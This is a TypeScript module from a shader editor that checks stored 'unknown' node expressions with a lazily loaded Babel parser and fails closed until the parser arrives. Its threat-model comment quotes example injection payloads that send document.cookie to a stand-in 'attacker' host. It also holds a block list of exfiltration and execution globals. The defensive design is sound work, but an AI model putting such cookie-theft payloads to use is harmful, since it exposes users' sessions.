/**
 * Validation of an `unknown` node's preserved `rawExpression`, and the ONE
 * place `@babel/parser` is reached from the codegen side.
 *
 * WHY THIS IS ITS OWN MODULE. graphToCode is boot-path (useSyncEngine and
 * ShaderPreview both import it statically), and a static `@babel/parser`
 * import there pinned the whole `vendor-babel` chunk — 805 KB raw / 202 KB
 * gzip, ~32% of the boot payload's gzip — into the entry wave, downloaded,
 * parsed and compiled before the editor was usable, although the one call
 * site runs only for graphs that actually contain an `unknown` node. The
 * parser is loaded here on demand instead; codegen stays synchronous by
 * FAILING CLOSED until it arrives (see isSafeUnknownExpression).
 *
 * THE THREAT MODEL. The `unknown`-node round-trip stores the original
 * call-expression substring in `rawExpression`. graphToCode re-emits it
 * verbatim into the generated module, so a hand-edited `.fastshader` file (or
 * anything else that can write the graph payload) could swap that string for
 * something like
 * `foo((()=>{ window.location='http://attacker/'+document.cookie })())` or
 * `foo(fetch('http://attacker'))` and inject arbitrary JS into the executing
 * shader module.
 *
 * codeToGraph's parser only ever stores the slice of a single CallExpression
 * with a bare-identifier callee. We re-parse on emit and require:
 *   1. parses cleanly as a JS expression (not a statement list)
 *   2. is a CallExpression
 *   3. the callee is a plain Identifier (no `something.eval(...)` /
 *      `(()=>{...})()` / bracket-property access at the top level)
 *   4. EVERY node in the subtree — including the arguments — is a pure
 *      data/TSL expression (isSafeExprNode), so the arguments can't smuggle
 *      `fetch`, an arrow-function IIFE, an assignment, etc.
 *
 * Sandboxing the preview iframe means even a successful injection lands in
 * an opaque-origin frame with no localStorage access, but defense in depth
 * is cheap here: keep the inert fallback (`float(0)`) so the shader still
 * compiles and the editor shows the magenta unknown-node tile, instead of
 * mid-flight surprising the user with attacker JS.
 */

// TYPE-ONLY, so it is erased at build time and pulls no runtime chunk.
import type { Node } from '@babel/types';

/**
 * Identifiers that must never appear anywhere in an `unknown`-node expression.
 * These are the gateways to code execution / exfiltration / navigation. Used
 * both as callee names and as referenced/member identifiers, so a payload
 * can't reach them via `window.eval`, `globalThis.fetch`, bracket access, etc.
 */
const FORBIDDEN_GLOBALS = new Set([
  'eval', 'Function', 'fetch', 'import', 'require', 'globalThis',
  'window', 'document', 'self', 'top', 'parent', 'frames', 'navigator',
  'location', 'localStorage', 'sessionStorage', 'indexedDB', 'postMessage',
  'XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker',
  'setTimeout', 'setInterval', 'queueMicrotask', 'constructor', '__proto__',
  'prototype', 'alert', 'open',
]);

/**
 * Recursively decide whether an expression AST node is a *pure data/TSL
 * expression* — literals, identifiers, swizzles, arithmetic, and calls to
 * (non-forbidden) functions whose arguments are themselves safe. Anything that
 * can execute attacker code — arrow functions / function expressions (IIFEs),
 * assignments, sequence/comma operators, computed (bracket) member access,
 * `new`, template literals, spreads, await/yield — falls through to the
 * `default` case and is rejected.
 */
function isSafeExprNode(node: Node | null | undefined): boolean {
  if (!node) return false;
  switch (node.type) {
    case 'NumericLiteral':
    case 'StringLiteral':
    case 'BooleanLiteral':
    case 'NullLiteral':
    case 'BigIntLiteral':
    case 'DecimalLiteral':
      return true;
    case 'Identifier':
      return !FORBIDDEN_GLOBALS.has(node.name);
    case 'UnaryExpression':
      // Allow the numeric/logical unaries that show up in real expressions
      // (e.g. `-1.0`, `!flag`); reject `delete`/`typeof`/`void`.
      return (node.operator === '-' || node.operator === '+' || node.operator === '!') &&
        isSafeExprNode(node.argument);
    case 'BinaryExpression':
      return ['+', '-', '*', '/', '%', '**'].includes(node.operator) &&
        node.left.type !== 'PrivateName' &&
        isSafeExprNode(node.left) && isSafeExprNode(node.right);
    case 'ArrayExpression':
      // A `null` element is an array hole; a SpreadElement falls through to
      // isSafeExprNode's default and is rejected.
      return node.elements.every((el) => el == null || isSafeExprNode(el));
    case 'MemberExpression':
      // Only `obj.prop` (static, non-forbidden property) — never `obj[expr]`.
      return !node.computed &&
        node.property.type === 'Identifier' &&
        !FORBIDDEN_GLOBALS.has(node.property.name) &&
        isSafeExprNode(node.object);
    case 'CallExpression': {
      const callee = node.callee;
      if (callee.type === 'Identifier') {
        if (FORBIDDEN_GLOBALS.has(callee.name)) return false;
      } else if (callee.type === 'MemberExpression') {
        // Method-chain callee, e.g. `vec3(...).mul(2)` — validate the chain.
        if (!isSafeExprNode(callee)) return false;
      } else {
        // Super(), import(), an IIFE callee, a tagged template, etc.
        return false;
      }
      return node.arguments.every((a) => isSafeExprNode(a));
    }
    default:
      return false;
  }
}

type ParseExpression = typeof import('@babel/parser').parseExpression;

/** The real parser, once its chunk has landed. `null` means "not yet". */
let parseExpr: ParseExpression | null = null;
/** In-flight load, so N cold expressions in one pass share one fetch. */
let loading: Promise<void> | null = null;

/**
 * Verdict cache: codegen re-runs on every graph change (per keystroke while
 * scrubbing), and each pass re-parsed every unknown node's rawExpression with
 * Babel. The verdict is a pure function of the string, so memoize it —
 * size-capped so pathological churn (many distinct adversarial expressions)
 * can't grow it unboundedly.
 *
 * Only REAL verdicts land here. A fail-closed answer given while the parser is
 * still loading is deliberately NOT cached, or the expression would stay inert
 * for the life of the session.
 */
const unknownExprVerdicts = new Map<string, boolean>();
const UNKNOWN_EXPR_CACHE_MAX = 500;
/** Expressions above this aren't cached — rawExpression is adversarial input,
 *  and 500 pinned multi-hundred-KB strings would be a memory hold. */
const UNKNOWN_EXPR_CACHE_MAX_LEN = 4096;

const listeners = new Set<() => void>();

/**
 * Load the parser chunk. Idempotent; resolves as soon as the parser is usable.
 *
 * Exported because two callers need to KNOW when validation is possible rather
 * than discover it: the tests (which assert on emitted code synchronously), and
 * anything that would rather pay the fetch up front than emit a frame of
 * fallbacks. A failed load clears `loading` so a later call retries — a chunk
 * that 404s once must not disable the validator for the session.
 */
export function loadUnknownExpressionValidator(): Promise<void> {
  if (parseExpr) return Promise.resolve();
  if (!loading) {
    loading = import('@babel/parser')
      .then((m) => { parseExpr = m.parseExpression; })
      .catch(() => { loading = null; });
  }
  return loading;
}

/**
 * Subscribe to "the validator just became available". Fires ONCE per load, and
 * only when something actually asked for a verdict while the parser was cold —
 * that is the case where an already-emitted module is holding fallbacks and its
 * producer needs to re-run. Returns an unsubscribe.
 */
export function onUnknownExpressionValidated(cb: () => void): () => void {
  listeners.add(cb);
  return () => { listeners.delete(cb); };
}

/**
 * Is `expr` safe to emit verbatim?
 *
 * SYNCHRONOUS, because codegen is. When the parser has not arrived yet the
 * answer is `false` — FAIL CLOSED: an expression that has not been checked by
 * the real parser is never emitted. The load is kicked off, and subscribers are
 * told when it lands so the pass can re-run and the expression can come back.
 */
export function isSafeUnknownExpression(expr: string): boolean {
  const cached = unknownExprVerdicts.get(expr);
  if (cached !== undefined) return cached;

  if (!parseExpr) {
    void loadUnknownExpressionValidator().then(() => {
      if (!parseExpr) return; // load failed; stay inert, a later call retries
      for (const cb of listeners) cb();
    });
    return false;
  }

  let verdict = false;
  try {
    const ast = parseExpr(expr, { sourceType: 'module', plugins: ['typescript'] });
    verdict =
      ast.type === 'CallExpression' &&
      ast.callee.type === 'Identifier' &&
      // Deep-validate the whole call (callee name + every argument subtree).
      isSafeExprNode(ast);
  } catch {
    verdict = false;
  }
  if (expr.length <= UNKNOWN_EXPR_CACHE_MAX_LEN) {
    // Evict oldest-first (Map preserves insertion order) instead of a
    // wholesale clear, so a hot graph keeps its working set warm.
    if (unknownExprVerdicts.size >= UNKNOWN_EXPR_CACHE_MAX) {
      const oldest = unknownExprVerdicts.keys().next().value;
      if (oldest !== undefined) unknownExprVerdicts.delete(oldest);
    }
    unknownExprVerdicts.set(expr, verdict);
  }
  return verdict;
}
